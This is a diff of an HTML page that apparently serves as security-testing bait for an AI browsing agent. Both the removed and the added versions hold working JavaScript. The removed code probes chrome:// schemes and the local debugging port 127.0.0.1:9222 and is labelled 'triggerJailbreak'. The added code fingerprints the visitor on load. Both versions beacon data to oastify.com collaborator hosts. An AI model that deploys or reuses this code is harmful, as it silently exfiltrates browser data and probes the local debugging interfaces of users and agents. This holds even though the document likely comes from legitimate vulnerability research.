@@ -1,43 +1,35 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Internal Browser Diagnostic</title>
+    <title>Atlas Agent Security Audit</title>
 </head>
 <body>
-    <h1>System Audit Phase: <span id="status">INIT</span></h1>
+    <h1>Audit Phase: <span id="status">Active Rendering</span></h1>
     <script>
-        const collab = "5z5gx0dkp49tbo47teikhf4c73dw1mpb.oastify.com";
-        const log = (path, data) => {
-            const b = btoa(JSON.stringify(data));
-            new Image().src = `https://${collab}/${path}?d=${b}`;
-        };
-
-        async function triggerJailbreak() {
-            // Target: Internal browser schemes (P2 Target)
-            const internalSchemes = [
-                "chrome://version", 
-                "view-source:https://www.google.com",
-                "chrome://net-export"
-            ];
-
-            internalSchemes.forEach(s => {
-                const ifr = document.createElement('iframe');
-                ifr.src = s;
-                ifr.style.display = 'none';
-                document.body.appendChild(ifr);
-                log("scheme_probe", {target: s});
-            });
-
-            // Target: Localhost Debugging Ports (P1/P2 Target)
-            try {
-                fetch("http://127.0.0.1:9222/json").then(r => r.json()).then(d => log("debug_hit", d));
-            } catch(e) {}
+        const collab = "9dnkb4ro38nxpsib7iwovjigl7r0fr3g.oastify.com";
+        
+        // Immediate Exfiltration (Shadow Execution Proof)
+        function notify(type, data) {
+            const payload = btoa(JSON.stringify(data));
+            new Image().src = `https://${collab}/${type}?v=${payload}`;
         }
 
         window.onload = () => {
-            log("start", {ua: navigator.userAgent});
-            triggerJailbreak();
-            setTimeout(() => { document.getElementById('status').innerText = "NODE_ID_ALPHA_77"; }, 5000);
+            // Proof 1: Environment Fingerprint
+            notify("shadow_exec_confirmed", {
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                lang: navigator.language,
+                ts: new Date().toISOString()
+            });
+
+            // Proof 2: Sandbox Context
+            notify("context_check", {
+                isIframe: window.self !== window.top,
+                location: window.location.href
+            });
+
+            document.getElementById('status').innerText = "AUDIT_COMPLETE_NODE_99";
         };
     </script>
 </body>
